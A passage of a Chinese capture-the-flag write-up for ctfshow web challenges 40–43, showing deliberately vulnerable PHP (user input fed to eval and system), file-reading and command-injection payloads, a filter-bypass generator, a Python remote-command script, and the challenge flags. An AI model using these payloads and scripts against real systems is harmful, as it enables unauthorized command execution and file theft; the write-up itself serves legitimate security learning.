php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_reverse</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>localeconv ()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号 (.)</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pos ()：返回数组中的当前元素的值。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>scandir ()：获取目录下的文件</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>array_reverse ()：数组逆序 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>next ()：函数将内部指针指向数组中的下一个元素，并输出。 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>show_source ()：对文件进行语法高亮显示</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>首先通过 pos (localeconv ()) 得到点号，因为 scandir (’.’) 表示得到当前目录下的文件，所以 scandir (pos (localeconv ())) 就能得到 flag.php 了</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;d100f4e0-8aba-4c75-837e-d67a710889f0&#125;\n</code></pre>\n<h2 id=\"web41\"><a class=\"anchor\" href=\"#web41\">#</a> web41</h2>\n<p>过滤不严，命令执行</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: 羽</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:31:22</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-05 22:40:07</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: 1341963450@qq.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctf.show</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"echo(<span class=\"token interpolation\"><span class=\"token variable\">$c</span></span>);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这里过滤了数字和字母还有一些符号，我们借用大佬的脚本先生成一个 ascii 码的文本</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 大体意思就是从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$myfile</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"rce_or.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">&lt;</span><span class=\"token number\">256</span> <span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token operator\">.</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t<span class=\"token variable\">$hex_i</span><span class=\"token operator\">=</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t<span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token operator\">.</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t<span class=\"token variable\">$hex_j</span><span class=\"token operator\">=</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token variable\">$preg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span> <span class=\"token punctuation\">,</span> <span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token class-name\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$preg</span> <span class=\"token punctuation\">,</span> <span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'%'</span><span class=\"token operator\">.</span><span class=\"token variable\">$hex_i</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'%'</span><span class=\"token operator\">.</span><span class=\"token variable\">$hex_j</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">|</span><span class=\"token class-name\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">32</span><span class=\"token operator\">&amp;</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">126</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t<span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token variable\">$contents</span><span class=\"token operator\">.</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$contents</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>再通过 python <span class=\"exturl\" data-url=\"aHR0cDovL2V4cC5weQ==\">exp.py</span> [url] 的方式运行。</p>\n<p>这里说一句，由于脚本导入了 urllib 包，python2 没找到，所以就用 python3，python3 自带的 urllib 包 (花了三小时找到结果)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> urllib</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> sys <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">\"php rce_or.php\"</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#没有将 php 写入环境变量需手动运行</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token operator\">*</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'USER：&lt;url>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"eg：  python exp.py http://ctf.show/\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token operator\">*</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>url<span class=\"token operator\">=</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">action</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   s1<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   s2<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> arg<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>       f<span class=\"token operator\">=</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rce_or.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>       <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>           t<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>           <span class=\"token keyword\">if</span> t<span class=\"token operator\">==</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>               <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>           <span class=\"token keyword\">if</span> t<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>i<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>               <span class=\"token comment\">#print(i)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>               s1<span class=\"token operator\">+=</span>t<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>               s2<span class=\"token operator\">+=</span>t<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>               <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>       f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>   output<span class=\"token operator\">=</span><span class=\"token string\">\"(\\\"\"</span><span class=\"token operator\">+</span>s1<span class=\"token operator\">+</span><span class=\"token string\">\"\\\"|\\\"\"</span><span class=\"token operator\">+</span>s2<span class=\"token operator\">+</span><span class=\"token string\">\"\\\")\"</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>   <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>   </pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>   param<span class=\"token operator\">=</span>action<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n[+] your function：\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>action<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] your command：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>   data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>       <span class=\"token string\">'c'</span><span class=\"token punctuation\">:</span>urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span>\t<span class=\"token operator\">//</span>参数，可改</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>       <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>   r<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n[*] result:\\n\"</span><span class=\"token operator\">+</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;729fcef2-a2e1-4a6e-87b4-e46e48ac9b62&#125;\n</code></pre>\n<h2 id=\"web42\"><a class=\"anchor\" href=\"#web42\">#</a> web42</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-05 20:51:55</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">></span><span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span><span class=\"token constant\">null</span> <span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span>主要意思是不进行回显的意思</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>分解这个组合：“<span class=\"token operator\">></span><span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span><span class=\"token constant\">null</span> <span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span>” 为五部分。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">1</span>：<span class=\"token operator\">></span> 代表重定向到哪里，例如：<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"123\"</span> <span class=\"token operator\">></span> <span class=\"token operator\">/</span>home<span class=\"token operator\">/</span><span class=\"token number\">123.</span>txt</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">2</span>：<span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span><span class=\"token constant\">null</span> 代表空设备文件</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">3</span>：<span class=\"token number\">2</span><span class=\"token operator\">></span> 表示stderr标准错误</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">4</span>：<span class=\"token operator\">&amp;</span> 表示等同于的意思，<span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span>，表示<span class=\"token number\">2</span>的输出重定向等同于<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">5</span>：<span class=\"token number\">1</span> 表示stdout标准输出，系统默认值是<span class=\"token number\">1</span>，所以<span class=\"token string double-quoted-string\">\">/dev/null\"</span>等同于 <span class=\"token string double-quoted-string\">\"1>/dev/null\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>我们要让命令回显，那么进行命令分隔即可</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 分号</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token comment\">// 只执行后面那条命令</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">||</span> <span class=\"token comment\">// 只执行前面那条命令</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">&amp;</span> <span class=\"token comment\">// 两条命令都会执行</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">&amp;&amp;</span> <span class=\"token comment\">// 两条命令都会执行</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>c<span class=\"token operator\">=</span>cat flag<span class=\"token operator\">.</span>php<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>c<span class=\"token operator\">=</span>cat flag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token class-name\">c</span><span class=\"token operator\">=</span>cat flag<span class=\"token operator\">.</span>php<span class=\"token operator\">%</span><span class=\"token number\">0</span>a  <span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">0</span>a换行符<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"web43\"><a class=\"anchor\" href=\"#web43\">#</a> web43</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter 